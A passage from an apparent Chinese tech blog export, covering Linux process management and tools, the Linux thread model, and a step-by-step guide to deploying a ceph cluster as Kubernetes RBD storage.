这个过程包括硬件上下文切换和软件上下文切换。 硬件上下文切换：主要通过汇编指令far jmp操作，将一个进程的描述符指针，替换为另一个进程描述符指针，并改变 eip、cs、esp等寄存器，从而改变程序的执行流。 软件上下文切换： 内存地址的切换，切换页全局目录，安装新的地址空间。 内核态堆栈的切换。 进程切换发生在schedule()函数中，内核提供了一个 need_resched 的标志，来表明是否需要重新执行一次调度。当某个进程被抢占或者更高优先级的进程进入可执行状态时，内核都会设置这个标志。那什么时候，内核会检查这个标志，来重新调度程序呢？那就是从内核态切换成用户态，或者从中断返回时。 执行系统调用时，会经历用户态与内核态的切换以及中断返回。也就是说，每一次执行系统调用，比如fork、read、write等，都可能触发内核调度新进程。 init进程 Linux进程是以树形的结构组织的，每一个进程都有唯一的进程标识，简称PID。PID为1的常常是init进程，它相对于普通进程来说，有三个特殊之处： 它没有默认的信号处理，因此如果发信号给init进程的话，会被它忽略掉，除非显示的注册过该信号。如果熟悉docker的同学，会观察到docker化的进程，如果按ctrl-c是没啥反应的，因为docker化的进程它们有独立的pid命名空间，第一个新创出的进程，pid为1，是不会理会kill signal信号的。 如果一个进程退出时，它还有子进程存在，被称为孤儿进程，那么这些孤儿进程会重新成为init进程的子进程，转由init进程来管理这些子进程，包括回收退出状态、从进程表中移除等。 如果init进程跪了，那么所有用户进程都会被退出。 与孤儿进程类似的是僵尸进程，清理僵尸进程的方法，是杀掉不断产生僵尸进程的父进程，然后这些僵尸进程会称为孤儿进程，由init进程接管、回收。 进程应用 进程间通信 谈到通信我们都知道，通信的双方必须存在一种可以承载信息的介质，对于计算机之间的通信来说，这种介质可以是双绞线、光纤、电磁波。那对于进程间的通信呢？这种介质有哪些呢？在Linux中，满足这种条件的介质，可以是： 操作系统提供的内存介质，比如共享内存、管道、信号量等。 文件系统提供的文件介质，比如UNIX域套接字、文件等 网络设备提供的网卡介质，比如socket套接字。 等等。 对于操作系统提供的介质来说，常用的有 信号量机制 匿名管道（仅限父子进程）与有名管道 SysV和POSIX 消息队列 共享内存 等等 优缺点介绍： 信号量：不能传递复杂消息，只能用来同步 匿名管道：容量有限速度较慢，只有父子进程能通讯 有名管道：任何进程间都能通讯，但速度较慢。 消息队列：容量受到系统限制，有队列的特性，先进先出。 共享内存：速度快，可以控制容量大小，但需要进行同步操作。 它们的用法相对较为简单，在需要使用时查阅相关文档即可，共享内存是比较常用的做法。 信号处理 信号最早是在Unix系统被引入，它主要用于进程间的通信，同时进程可以主动注册信号处理函数，来检测或者应对系统发生的事件。比如当进程访问非法地址空间时，进程会收到操作系统发送SIGSEGV信号，默认情况下的处理方式是：该进程会退出并且把堆栈dump出来，简称出core。 总的来说信号的主要目的： 让进程知道已经发生的特定事件。 强迫进程处理这个特定事件。 目前Linux支持的信号，已经默认的处理函数，可以在man手册中查到，截图如下： 比较常见的信号，解释如下： SIGCHLD: 一个进程通过 fork 函数创建，当它结束时，会向父进程发送SIGCHLD信号。 SIGHUP: 挂起信号，当检测到控制终端，或者控制进程死亡时。比如用户退出shell终端时，该shell启动的所有进程，都会收到这个信号，默认是终止进程。 SIGINT：当用户按下Ctrl+C组合键时，终端会向该进程发送此信号，默认是终止进程。 SIGKILL: 常用的kill -9指令会发送该信号，无条件终止进程，本信号无法被忽略。 SIGSEGV: 进程访问了非法的内存地址，默认行为是终止进程并产生core堆栈。 SIGTERM: 程序结束信号，该信号可以被阻塞和忽略，通常标识程序正常退出。 SIGSTOP: 停止进程的执行，该信号不能被忽略，默认动作为暂停进程。 SIGPIPE: 当往一个写端关闭的管道或socket连接中连续写入数据时会引发SIGPIPE信号,引发SIGPIPE信号的写操作将设置errno为EPIPE。在TCP通信中，当通信的双方中的一方close一个连接时，若另一方接着发数据，根据TCP协议的规定，会收到一个RST响应报文，若再往这个服务器发送数据时，系统会发出一个SIGPIPE信号给进程，告诉进程这个连接已经断开了，不能再写入数据。 其实在项目开发中，常常会和信号处理打交道。比如在处理程序优雅退出时，一般需要捕获SIGINT、SIGPIPE、SIGTERM等信号，以合理的释放资源、处理剩余链接等，防止程序意外crash，导致的一些问题。 后台进程与守护进程 在接触Linux系统时，常常会遇到后台进程与守护进程，这里简单的介绍一下这两种进程。 后台进程：通常情况下，进程是放置在前台执行，并占据当前shell，在进程结束前，用户无法再通过shell做其他操作。对于那些没有交互的进程，可以将其放在后台启动，也就是启动时加一个 &amp;，那么在该进程运行期间，我们仍是可以通过shell操作其他命令。不过当shell退出时，该后台进程也会退出。 守护进程：如果一个进程总是以后台的方式启动，并且不能受shell退出的影响而退出，那么可以将其改造为守护进程。后续进程是系统长期运行的后台进程，比如mysqld、nginx等常见的服务进程。 那么这两者有啥区别呢？ 守护进程已经完全脱离终端，而后台进程并未完全脱离终端，即后台进程仍是可以输出到终端的。 在终端关闭时，后台进程会收到信号退出，但是守护进程则不会。 举个例子，通过./spider &amp;在后台执行抓取任务，但没过多久，终端自动断开，导致spider进程中断退出。 在进一步了解守护进程之前，还需要了解一些会话和进程组的概念。 进程组：由一系列相互关联的进程组成，由PGID来标识，一般是进程组创建进程的PID。进程组的存在是为了方便对多个相关进程执行统一的操作，比如发送信号量给统一进程组的所有进程。 会话：由若干个进程组组成，每一个进程组从属于一个会话，一个会话对应着一个控制终端，该终端为会话所有进程组的进程所共用，其中只有前台进程组才可以与终端交互。 那如何实现一个守护进程呢？ 在后台运行：fork出子进程A，当前进程退出，保留子进程A。 脱离控制终端：目的是摆脱终端的影响，通过setsid()重新为子进程A设置新的会话。 禁止子进程A重新打开终端：因为设置新会话之后的进程A，是进程组的组长，所以它是有能力重新申请打开一个控制终端。通过再次fork子进程B，并退出进程A，B不再是进程组组长，也无法打开新的终端。 关闭已打开的文件描述符、改变工作目录等等。 处理SIGCHILD信号：由于守护进程一般是长期运行的进程，当产生子进程时，需要处理子进程退出时发送的SIGCHILD信号，不然子进程就会变成僵尸进程，从而占据系统资源。 总结来说，守护进程是一种长期运行于后台的进程，它脱离了控制终端，不受用户终端退出的影响。可以通过nohup操作，将一个进程变成守护进程执行。比如nohup ./spider &amp;，这样即使终端断开后，spider进程仍会继续执行。 浅谈nginx多进程模型 nginx是一款高性能的Web服务器，由于它优秀的性能、成熟的社区、完善的文档，受到广大开发者的喜爱和支持。它的高性能与其架构是分不开的，nginx的框架如下图所示： Nginx是经典的多进程模型，它启动以后以守护进程的方式在后台运行，后台进程包含一个master进程，和多个worker进程。其中master进程相当于控制进程，有以下作用： 接收外界信号执行指令，包括配置加载、向worker发指令、优雅退出等等。 维护worker进程的状态，当worker进程退出后，自动启动新的worker。 其中 master 进程支持的信号处理如下： TERM、INT：快速退出 QUIT：优雅退出 HUP: 变更配置，用新配置启动worker，优雅关闭老的worker等。 USR1: 重新打开日志文件 USR2: 升级二进制文件（nginx升级） WINCH: worker进程的优雅退出 单个worker进程也支持信号处理，包括： TERM、INT: 快速退出 QUIT: 优雅退出 USR1: 重新打开日志文件 WINCH: 终端调试等 worker进程基于异步非阻塞的模式处理每个请求，这种非阻塞的模式，大大提高了worker进程处理请求的速度。为了尽可能的提高性能，nginx对每个worker进程设置了CPU的亲和性，尽量把worker进程绑定在指定的CPU上执行，以减少上下文切换带来的开销。由于这种绑核的模式，一般推荐worker进程的数目，为CPU的核数。 nginx使用了master&lt;-&gt;worker这种多进程的模型，有哪些好处呢？ worker进程间很少共享资源，在处理各自请求时，几乎不用加锁，省掉了锁带来的开销。 worker进程间异常不会相互影响，一个进程挂掉之后，其他进程还在工作，可以提高服务的稳定性。 尽可能的利用多核特性，最大化利用系统资源。 常用工具介绍 Linux内置了许多工具，用于排查系统问题和查看资源使用情况，这里简单介绍和进程有关的几个工具。 ps: 查看进程的基本属性 常用的参数如下： ps aux : 查看所有进程的基本信息 ps -p $pid : 查看指定pid的进程 ps -fp $pid : 打印的进程信息较全 自定义打印进程的信息：例如ps -C nginx -o pid,ppid,rsz,vsz,pcpu: 打印nginx进程的pid、ppid、实存、虚存、cpu。 ps axjf：查看进程树：，使用pstree -p $pid更加直观 ps -T -p $pid或者ps -Lf $pid: 查看进程的线程信息 等等 除了通过ps获取进程的信息外，还可以通过/proc文件系统来查看进程的基本信息： /proc/$pid/cmdline: 进程的命令行参数 /proc/$pid/cwd: 当前工作目录 /proc/$pid/environ: 环境变量值 /proc/$pid/exe: 软链到二进制执行程序。 /proc/$pid/fd: 包含所有的文件描述符。 /proc/$pid/maps: 内存映射，包括二进制和lib文件。 /proc/$pid/mem: 进程的内存 /proc/$pid/stat: 进程状态 等等 lsof: 查看进程打开的文件情况 有两个场景： 场景一：机器上一个文件大小不停的增长，导致磁盘空间一次又一次的爆满，如果这时候你想把写文件的罪魁祸首进程找到，那应该怎么做呢？ 场景二：发现磁盘已经快满了，通过rm -f 删除一些大文件，但磁盘空间并没有明显减少，这个时候应该怎么做呢？ 对于这些场景，我们可以借助lsof命令， 对于场景一来说：可以查看该文件被哪个进程打开，找到罪魁祸首进程，然后对其处理。 对于场景二来说：如果这个文件被其他进程打开，通过rm -f是无法真正删掉一个文件的，还需要杀掉打开该文件的进程，以关闭文件描述符，那么文件才能真正被清理。 lsof的常见用法如下： 查看特定用户打开的文件列表：lsof -u xxx 查看特定端口打开的文件列表：lsof -i 8080 查看特定端口范围打开的文件列表：lsof -i :1-1024 基于TCP或者UDP查看打开的文件列表：lsof -i udp 查看特定进程打开的文件列表：lsof -p $pid 查看打开特定文件的进程列表：lsof -t $file_name 查看打开特定目录的进程列表：lsof +D $file_path 等等 netstat: 查看网络连接情况 netstat是一个监控TCP/IP网络非常有用的工具，它可以显示路由表、网络连接、网络接口设备状态等信息。输出的信息类型由第一个参数决定： (none): 默认情况下，netstat会显示打开的socket列表。 –route，-r: 显示内核的路由表，和 -e 的输出相同。 –group，-g: 显示IPv4和IPv6的多播组成员身份信息。 –interfaces, -i: 显示网络接口状态。 –statistics, -s: 显示每一种协议的统计信息。 下面列举各个场景的使用用法： 仅显示数字地址：netstat -n 仅显示tcp链接：netstat -t 仅显示udp链接：netstat -u 仅显示监控socket链接：netstat -l 显示进程的名字和PID：netstat -p strace: 查看系统调用情况 strace用来跟踪进程执行时的系统调用和所接收的信号。在Linux中，进程是无法直接访问硬件设备的，当访问硬件设备时，必须要切换至内核态模式，通过系统调用来访问硬件设备。 strace可以跟踪到一个进程产生的系统调用，包括参数、返回值、执行消耗的时间。每一行的输出，左边是系统调用的函数名和参数，后面是调用的返回值。用法如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556-c 统计每一系统调用的所执行的时间,次数和出错的次数等.-d 输出strace关于标准错误的调试信息.-f 跟踪由fork调用所产生的子进程.-ff 如果提供-o filename,则所有进程的跟踪结果输出到相应的filename.pid中,pid是各进程的进程号.-F 尝试跟踪vfork调用.在-f时,vfork不被跟踪.-h 输出简要的帮助信息.-i 输出系统调用的入口指针.-q 禁止输出关于脱离的消息.-r 打印出相对时间关于,,每一个系统调用.-t 在输出中的每一行前加上时间信息.-tt 在输出中的每一行前加上时间信息,微秒级.-ttt 微秒级输出,以秒了表示时间.-T 显示每一调用所耗的时间.-v 输出所有的系统调用.一些调用关于环境变量,状态,输入输出等调用由于使用频繁,默认不输出.-V 输出strace的版本信息.-x 以十六进制形式输出非标准字符串-xx 所有字符串以十六进制形式输出.-a column设置返回值的输出位置.默认 为40.-e expr指定一个表达式,用来控制如何跟踪.格式如下:[qualifier=][!]value1[,value2]...qualifier只能是 trace,abbrev,verbose,raw,signal,read,write其中之一.value是用来限定的符号或数字.默认的 qualifier是 trace.感叹号是否定符号.例如:-eopen等价于 -e trace=open,表示只跟踪open调用.而-etrace!=open表示跟踪除了open以外的其他调用.有两个特殊的符号 all 和 none.注意有些shell使用!来执行历史记录里的命令,所以要使用\\.-e trace=set只跟踪指定的系统 调用.例如:-e trace=open,close,rean,write表示只跟踪这四个系统调用.默认的为set=all.-e trace=file只跟踪有关文件操作的系统调用.-e trace=process只跟踪有关进程控制的系统调用.-e trace=network跟踪与网络有关的所有系统调用.-e strace=signal跟踪所有与系统信号有关的 系统调用-e trace=ipc跟踪所有与进程通讯有关的系统调用-e abbrev=set设定 strace输出的系统调用的结果集.-v 等与 abbrev=none.默认为abbrev=all.-e raw=set将指 定的系统调用的参数以十六进制显示.-e signal=set指定跟踪的系统信号.默认为all.如 signal=!SIGIO(或者signal=!io),表示不跟踪SIGIO信号.-e read=set输出从指定文件中读出 的数据.例如:-e read=3,5-e write=set输出写入到指定文件中的数据.-o filename将strace的输出写入文件filename-p pid跟踪指定的进程pid.-s strsize指定输出的字符串的最大长度.默认为32.文件名一直全部输出.-u username以username 的UID和GID执行被跟踪的命令 当服务器卡顿时，可以通过strace系统调用查看特定进程的系统调用执行情况： 1strace -c -tt -o ./server.log -p 26844 输出如下： 12345% time seconds usecs/call calls errors syscall------ ----------- ----------- --------- --------- ----------------100.00 0.170843 2512 68 epoll_wait------ ----------- ----------- --------- --------- ----------------100.00 0.170843 68 total]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈Linux线程模型]]></title>
    <url>%2F2019%2F02%2F20%2F%E6%B5%85%E8%B0%88Linux%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[写在前面 线程基础 线程概念 Linux线程实现方式 Linux Thread vs Process 资源共享层面的差异 调度层面的差异 性能层面的差异 Thread 缺点 &amp;&amp; 应用场景 Linux Thread 使用 创建线程 内核线程 同步操作 常见的多线程编程模式 leader-follow 模型（主从） producer-consumer模型（生产者消费者） 高并发索引模型 踩过的坑 同步问题 过载保护 公平调度 Core问题 析构出core 多线程访问STL出core 等等 线程是每一个程序员都耳熟能详的概念，它是软件开发过程中，不可缺少的一环。而线程的概念比较抽象，它是操作系统的一个概念，是程序执行流的最小单元，不同的操作系统有不同的实现方式，我今天分享的是 Linux 系统下的线程模型。 Thread Basic 基础概念 线程是操作系统能够调度和执行的基本单位，在Linux中也被称之为轻量级进程。从定义中可以看出，线程它是操作系统的概念，在不同的操作系统中的实现是不同的，不过今天分享的猪脚是Linux Thread。 对于Linux操作系统而言，它对Thread的实现方式比较特殊。在Linux内核中，其实是没有线程的概念的，它把所有的线程当做标准的进程来实现，也就是说Linux内核，并没有为线程提供任何特殊的调度语义，也没有为线程实现特定的数据结构。取而代之的是，线程只是一个与其他进程共享某些资源的进程。每一个线程拥有一个唯一的task_struct结构，Linux内核它仅仅把线程当做一个正常的进程，或者说是轻量级进程，LWP(Lightweight processes)。 对于其他的操作系统而言，比如windows，线程相对于进程，只是一个提供了更加轻量、快速执行单元的抽象概念。对于Linux而言，线程只是进程间共享资源的一种方式，非常轻量。举个简单例子，假设有一个进程包含了4个线程。对于那些显示支持线程的操作系统而言，应该是存在一个进程描述符，依次轮流指向四个线程。这个进程描述符指明共享资源，包括内存空间和打开的文件，然后线程描述它们自己独享的资源。相反的是在Linux中，只有四个进程，因此有4个task_struct数据结构，只是这些数据结构的某些资源项是共享的。 上面简单提到了Linux系统和其他操作系统线程实现的差异，这里再总结一下，Linux线程是进程资源共享的一种方式，而其他操作系统，线程则是一种实现轻量、快速执行单元的抽象概念或者实体。这里再深入的理解一下，Linux中的线程和进程的区别。这也是诸多面试题中，最常见的一个。 资源共享 Linux线程与进程的区别，主要体现在资源共享、调度、性能几个方面，首先看一下资源共享方面。上面也提到，线程其实是共享了某一个进程的资源，这些资源包括： 内存地址空间 进程基础信息 大部分数据 打开的文件 信号处理 当前工作目录 用户和用户组属性 等等 哪些是线程独自拥有的呢？ 线程ID 一系列的寄存器 栈的局部变量和返回地址 错误码 errno 信号掩码 优先级 等等 这里说一个黑科技，线程拥有独立的调用栈，除了栈之外共享了其他所有的段segment。但是由于线程间共享了内存，也就是说一个线程，理论上是可以访问到其他线程的调用栈的，可以用一个指针变量，去访问其他线程的局部栈帧，以访问其他线程的局部变量。 调度 刚刚从资源共享层面提到了线程与进程的区别，接下来看看线程与进程在调度层面的区别。说到调度，就得提到进程的上下文切换。上下文切换也被称作为进程调度或者任务切换，简单的来说是把CPU从一个进程或者线程切换到另一个执行。概括的来说，线程的上下文切换，要比进程更加快速，因为本质上，线程很多资源都是共享进程的，所以切换时，需要保存和切换的项是很少的。 线程上线文切换时，虚拟地址空间是不变的，但是进程上下文切换时，是需要重新映射虚拟地址空间。进程切换上下文时，进出OS内核&amp;寄存器切换，是最大的时间支出。更模糊的代价是上下文切换时，会干扰处理器的缓存机制。当上下文切换时，处理器需要重新cache一些内存。 这里更大的一个区别时，当更改虚拟地址空间时，CPU 的 TLB 等也会被刷新，导致接下来的内存访问更加耗时，所以相对线程切换来说，进程的切换耗时更大。 性能 从性能方面，来查看一下线程与进程的对比。由于线程更加轻量，导致线程的创建速度、切换速度都要高于进程。这里就有一个疑问了，从上面提到的各个方面来看，好像线程都要优于进程，那么有没有啥缺点呢？ 线程缺点 线程同样也有缺点，最大的缺点是线程的不安全性，缺乏保护机制。就是上面提到的黑科技，因为线程间共享数据，一个线程可以重写另外一个线程的堆栈，导致出现一些异常的情况。除此之外，线程还有以下缺点： 共享属性：全局变量是在所有线程间共享的，访问时是需要同步加锁。 很多库函数是线程非安全的，多线程编程时，需要注意这一点。 线程的健壮性不强，如果一个线程crash了，那么整个应用程序就跪了。 应用场景 上面提到了线程与进程的对比，也提到了线程的优点和缺点，那么什么情况下适合用线程呢？简单的来说，计算密集型的任务，适合于多线程来处理。因为计算密集型任务，需要耗费很多CPU，上下文的切换是非常频繁的，而线程切换速度是高于进程的，所以使用线程是更加适合的。在实际的编程过程中，根据业务的场景，再结合进程和线程的优缺点对比，来决定适合的编程模型。 线程创建 那么Linux中线程是如何创建出来的呢？上面也提到，在Linux中线程是一种资源共享的方式，可以在创建进程的时候，指定某些资源是从其他进程共享的，从而在概念上创建了一个线程。在Linux中，可以通过clone系统调用来创建一个进程，它的函数签名如下： 12#include &lt;sched.h&gt;int clone(int (*fn)(void *), void *child_stack, int flags, void *arg, ...); 我们在使用clone创建进程的过程中，可以指明相应的参数，来决定共享某些资源，比如: 1clone(CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND, 0); V15: 这个clone系统调用的行为类似于fork，不过新创建出来的进程，它的内存地址、文件系统资源、打开的文件描述符和信号处理器，都是共享父进程的。换句话说，这个新创建出来的进程，也被叫做Linux Thread。从这个例子中，也可以看出Linux中，线程其实是进程实现资源共享的一种方式。 内核线程 在Linux中，还存在一个Kernel Thread的概念，也就是内核线程。内核创建一些内核线程来执行一些后台任务。相对于普通的进程，内核线程完整的存在于内核空间，是没有自己的地址空间的，也就是mm指针为空，它的操作仅存在于内核态，并且也不会上下文切换到用户态。不过内核线程和普通进程类似的是，是可调度和可抢占的。 同步 由于线程间共享了很多资源，所以在多线程的编程环境下，为了保障结果的准确性和一致性，需要对共享资源的访问进行同步。常见的同步方式，也就是加锁，以保障操作共享资源时，不会出错。在Linux中，锁的种类大致有四种: 互斥锁 读写锁 条件变量 自旋锁 内存屏障 有兴趣的同学，看看看下这篇文章：http://blog.lecury.cn/2016/02/21/同步互斥锁/ 。总结来说，锁的代价是高昂的，所以在设计高并发、高吞吐的程序时，尽量避免锁的使用，或者减少锁的区间。 常见的多线程编程模式 下面谈一下实际工作中，要如何合理的线程呢？这里我简单的提出三种常见的线程模型。 leader-follow 模型（主从） 线程与连接对应，并发度等于线程数。 所有线程经历accept-&gt;close整个过程。 适用于连接数少、处理时间长、CPU密集型服务。 producer-consumer模型（生产者消费者） 主线程用于accept请求，并将fd放置在消费队列pendingpool中。 pendingpool进行连接的维护工作。 多个worker竞争pendingpool的连接。 适用于连接数多、处理速度快的业务。 高并发索引模型 无锁设计 将请求或者事务映射到具体线程处理 踩过的坑和小技巧 同步 多线程场景下访问共享资源，需要关注同步问题，否则容易出现数据错乱、甚至程序crash问题。 比较推荐的做法：优先使用线程变量，即通过 __thread 来修饰数据成员。其次可以使用栈，对于全局内存的访问，需要关注访问顺序，必要情况下进行加锁。 过载保护 多线程场景下处理任务时，常用到队列，即多线程从任务队列中取出任务，然后并发处理。如果对任务处理速度有时效性要求，需要关注过载保护的问题。当任务量多大，或者线程来不及处理时，需要及时丢弃队列中的任务，以保证高吞吐和低延迟。 公平调度 多线程场景下，也会遇到线程调度方面的问题，线程的调度对用户都是透明的，有时可能会遇到调度不公的情况，使得一个线程负载过高的问题。 析构出core 线程退出时析构出core的问题，比如一个线程即将退出，并释放了申请的内存，如果该内存在其他内存中，正在被访问，就会遇到出core的问题。这个时候需要关注优雅退出时，析构的顺序。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ceph on kubernetes]]></title>
    <url>%2F2018%2F01%2F28%2Fceph-on-k8s%2F</url>
    <content type="text"><![CDATA[本文简介 本文主要叙述在 ubuntu 16.04 环境上搭建 ceph 集群，并介绍 k8s 集群以 storageclass 方式使用 ceph 的两种方式。本文测试环境共 4 台机器: 1234ceph-monceph-01ceph-02ceph-03 其中 ceph-mom 当做集群的监控节点，剩下三台当做数据节点，其中 ceph-01、ceph-02、ceph-03 机器有挂了 2 块磁盘，其中一块为系统盘，另外一块为数据盘 /dev/sdb。 前置条件 在真正的安装 ceph 集群之前，需要完成以下前置条件: 建立机器间的 SSH 信任关系 安装 Python2 环境 格式化数据盘，并制作文件系统，本文选择的是 XFS 文件系统 建立机器间的 SSH 信任关系 以 ceph-mon 为登录机器和部署机器，通过 1ssh-keygen -t rsa 来生成 RSA 钥匙，建立 ceph-mon 与剩下三台机器的 SSH 信任关系。 安装 Python2 环境 分别在这4台机器上安装 Python2 环境，并建立 python2 链接到 python2.7 的软链。 格式化数据盘 首先检查磁盘分区 1sudo fdisk -l /dev/sdb 格式化数据盘 1sudo parted -s /dev/sdb mklabel gpt mkpart primary xfs 0% 100% 制作 XFS 文件系统 1sudo mkfs.xfs -f /dev/sdb 然后再检查一下磁盘分区 12sudo fdisk -s /dev/sdbsudo blkid -o value -s TYPE /dev/sdb 开始安装 现在正式开始安装 ceph 集群，本文的安装方法是通过 ceph-deploy 脚本来辅助安装的。 安装 ceph-mon 节点 首先登录 ceph-mon 节点，执行 123wget -q -O- 'https://download.ceph.com/keys/release.asc' | sudo apt-key add -echo deb http://download.ceph.com/debian-$&#123;ceph-stable-release&#125;/ $(lsb_release -sc) main | sudo tee /etc/apt/sources.list.d/ceph.listsudo apt-get update &amp;&amp; sudo apt-get install ceph-deploy 其中 ${ceph-stable-release} 那一行可以替换为 1echo "deb http://mirrors.163.com/ceph/debian-jewel xenial main" | sudo tee /etc/apt/sources.list.d/ceph.list 通过这些步骤就可以在 ceph-mon 上安装了 ceph-deploy 部署工具。然后开始创建集群 12mkdir -p /home/ceph/mon &amp;&amp; cd /home/ceph/monceph-deploy new ceph-mon 其中 ceph-mon 是 mon 节点，执行该命令会生成 ceph 配置文件、monitor 密钥文件以及日志文件。因为我们是使用 XFS 文件系统，所以在本路径下的 ceph.conf 中添加一下配置 123osd max object name len = 256osd max object namespace len = 64osd pool default size = 2 安装 ceph-node 节点 接下来开始安装 ceph-node 节点，执行以下命令： 1ceph-deploy install ceph-01 ceph-02 ceph-03 在这三台机器上安装好 ceph 组件之后，就可以继续初始化 mon 节点和收集集群信息了。 初始化集群 1ceph-deploy mon create-initial 执行完毕，目录应该有以下文件： 1234$&#123;cluster-name&#125;.client.admin.keyring$&#123;cluster-name&#125;.bootstrap-osd.keyring$&#123;cluster-name&#125;.bootstrap-mds.keyring$&#123;cluster-name&#125;.bootstrap-rgw.keyring 初始化数据节点 首先检查一下每个数据节点的磁盘情况： 1ceph-deploy disk list ceph-01 ceph-02 ceph-03 接下来初始化数据节点的磁盘，本次使用的是 /dev/sdb 1ceph-deploy disk zap ceph-01:/dev/sdb ceph-02:/dev/sdb ceph-03:/dev/sdb 然后开始准备 OSD 节点，确保没有错误发生 1ceph-deploy osd prepare ceph-01:/dev/sdb ceph-02:/dev/sdb ceph-03:/dev/sdb 接下来激活 OSD 1ceph-deploy osd activate ceph-01:/dev/sdb ceph-02:/dev/sdb ceph-03:/dev/sdb 可以再次检查一下如下节点： 1ceph-deploy disk list ceph-01:/dev/sdb ceph-02:/dev/sdb ceph-03:/dev/sdb 配置 admin 节点 将管理钥匙分发给每个节点 1ceph-deploy admin ceph-01 ceph-02 ceph-03 确保每个节点上文件钥匙仅具有可读权限 1sudo chmod +r /etc/ceph/ceph.client.admin.keyring 集群测试 首先检查集群是否健康 1ceph health 检查集群的状态 1ceph -s 观察集群 osd 情况 1ceph osd tree ceph on k8s 接来下着重介绍一下 k8s 如何使用 ceph 集群，目的是把 ceph 作为 k8s 的分布式存储，这里是通过 k8s 的 storageclass 实现的。 创建 pool 所有用户使用共享的 pool 1ceph osd pool create kube 1024 1024 # 生产环境下，“1024 1024”参数需要根据实际情况调整 创建 kube 用户 kube 是可以读写 kube pool 并可以 lock image 等的用户，用于挂载 PV。 12ceph auth add client.kube mon 'allow r' osd 'allow rwx pool=kube'added key for client.kube 为 k8s 使用 secret 创建 secret 创建 secret yaml 文件，如下： 123456789101112131415161718apiVersion: v1kind: Secretmetadata: name: ceph-admin-secret namespace: kube-systemtype: "kubernetes.io/rbd"data: # 使用 ceph auth get-key client.admin | base64 命令获取 key: QVFDQk9ReFpMMzRiS0JBQXp4Y3hPYjgyU1lPdVBXajc2VjhyV0E9PQ==---apiVersion: v1kind: Secretmetadata: name: ceph-secrettype: "kubernetes.io/rbd"data: # 使用 ceph auth get-key client.kube | base64 命令获取 key: QVFDS3NnbFpJWTZTTGhBQTRjOXVmbWhFUEdKVTQyd2tlQzFsMXc9PQ== 注意： ceph-admin-secret 是用于 RBD Provisioner 创建 image 用，使用 ceph 的 client.admin 用户即可 ceph-secret 是用于 RBD Volume Plugin 在 node 上挂载 image 用，使用前面新建的 client.kube 用户 创建 RDB storageclass（方式一） 有两种方式可以创建 RDB storageclass，方式一通过 kube-controller-manager 内置的 RBD Provisioner 123456789101112131415161718## Using rbd provisioner to create image dynamically, need# kube-controller-mananger to access `rbd` command.#kind: StorageClassapiVersion: storage.k8s.io/v1metadata: name: cephprovisioner: kubernetes.io/rbdparameters: monitors: 100.64.0.20:6789 # ceph monitors 地址 pool: kube # ceph pool，从这个 pool 创建 image adminId: admin # ceph 管理员账户，StorageClass 使用改帐号创建 image adminSecretNamespace: kube-system # ceph 管理员账户的 secret 所在 ns，可以配置任意 ns，推荐非用户的 kube-system adminSecretName: ceph-admin-secret # ceph 管理员账户的 secret 名字 userId: kube # ceph 用户账户，用于 map image 的，只需要 rwx `kube` 这个 pool 的权限即可 userSecretName: ceph-secret # ceph 用户帐号的 secret，挂载 pv 时从 pvc 所在的 ns 中找对应的 secret，所以每个用户 ns 下都需要用该 secret，里面内容保持一样 fsType: xfs # default ext4 注意： StorageClass 是全局资源，不属于某一个 namespace，由集群管理员配置（用户不可见） adminSecret 放在 kube-system namespace 下，由集群管理员配置（用户不可见） userSecret 需要给每一个需要使用 pvc 的用户 namespace 下配置一个（用户可见） 备注如果是使用 coreos 搭建的 k8s 集群，work 节点在绑定 pvc 的时候出现 rbd command not find 错误，这个是由于 kubelet 在绑定 pvc 的时候没有找到 rbd 命令， 解决办法参考：https://github.com/ceph/ceph-container/tree/master/examples/kubernetes-coreos 主要思想是通过容器安装 rbd 的方式，将 rbd 二进制挂载出来给 kubelet 用，因为 coreos 系统本身不支持安装。 创建 RDB storageclass（方式二 推荐做法） Kuberentes 社区在将 Volume Provisioner 实现独立出来，见：https://github.com/kubernetes-incubator/external-storage 。以下是 RBD Provisioner 部署方法： 首先是部署 RBD Provisioner 程序，请到 https://quay.io/repository/external_storage/rbd-provisioner?tag=latest&amp;tab=tags 查看，建议每次部署使用最新版。 123456789101112131415apiVersion: extensions/v1beta1kind: Deploymentmetadata: name: rbd-provisioner namespace: kube-systemspec: replicas: 1 template: metadata: labels: app: rbd-provisioner spec: containers: - name: rbd-provisioner image: "quay.io/external_storage/rbd-provisioner:&lt;latest-tag&gt;" 接下来配置 RBD StorageClass 12345678910111213kind: StorageClassapiVersion: storage.k8s.io/v1metadata: name: rbdprovisioner: ceph.com/rbdparameters: monitors: ceph monitor addresses pool: kube adminId: admin adminSecretNamespace: kube-system adminSecretName: ceph-admin-secret userId: kube userSecretName: ceph-secret 最后，使用前面的 name 为 “rbd” 的 storage class 申请 PV 123456789101112kind: PersistentVolumeClaimapiVersion: v1metadata: name: claim1spec: accessModes: - ReadWriteOnce storageClassName: rbd resources: requests: storage: 1Gi 参考资料 https://www.howtoforge.com/tutorial/how-to-install-a-ceph-cluster-on-ubuntu-16-04/ http://www.cnblogs.com/int32bit/p/5392527.html https://kubernetes.io/docs/concepts/storage/persistent-volumes/ https://github.com/kubernetes/kubernetes/tree/master/examples/volumes/rbd http://docs.ceph.com/ https://docs.openshift.org/latest/install_config/persistent_storage/persistent_storage_ceph_rbd.html https://docs.openshift.org/latest/install_config/storage_examples/ceph_example.html 最后感谢付总(https://github.com/cofyc)的 ceph rbd on k8s 文献。]]></content>
      <tags>
        <tag>kubernetes</tag>
        <tag>ceph</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CRI & runc 介绍]]></title>
    <url>%2F2017%2F11%2F19%2FCRI%26runc%E4%BB%8B%E7%BB%8D%2F</url>
